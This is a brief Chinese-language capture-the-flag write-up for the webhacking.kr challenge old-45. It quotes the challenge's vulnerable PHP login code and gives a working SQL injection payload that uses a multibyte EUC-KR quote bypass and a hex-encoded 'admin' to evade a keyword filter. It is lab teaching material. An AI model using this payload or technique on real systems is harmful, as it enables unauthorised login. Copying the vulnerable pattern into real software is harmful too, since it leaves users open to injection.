# old-45_550

* 這一題一進去就可以看到斗大的提示 sql injection
* 看一下 source code
    ```php=
    if($_GET['id'] && $_GET['pw']){
        $db = dbconnect();
        $_GET['id'] = addslashes($_GET['id']);
        $_GET['pw'] = addslashes($_GET['pw']);
        $_GET['id'] = mb_convert_encoding($_GET['id'],'utf-8','euc-kr');
        if(preg_match("/admin|select|limit|pw|=|<|>/i",$_GET['id'])) exit();
        if(preg_match("/admin|select|limit|pw|=|<|>/i",$_GET['pw'])) exit();
        $result = mysqli_fetch_array(mysqli_query($db,"select id from chall45 where id='{$_GET['id']}' and pw=md5('{$_GET['pw']}')"));
        if($result){
          echo "hi {$result['id']}";
          if($result['id'] == "admin") solve(45);
        }
        else echo("Wrong");
  }
    ```
* 這裡可以看到一個老朋友 `mb_convert_encoding($_GET['id'],'utf-8','euc-kr');` 方便我們有機可趁
* 如果不知道為什麼的話，可以參考一下[這一篇](https://websec.wordpress.com/2012/06/12/secuinside-ctf-writeup-sqlgeek/)
* 解決的話，這一題是真的挺基礎的 sql injection 的，沒什麼技巧，只是要繞過相關的 WAF 而已
* 這是我的 payload `?id=%bf%27%20or%20id%20like%200x61646d696e%23&pw=123`
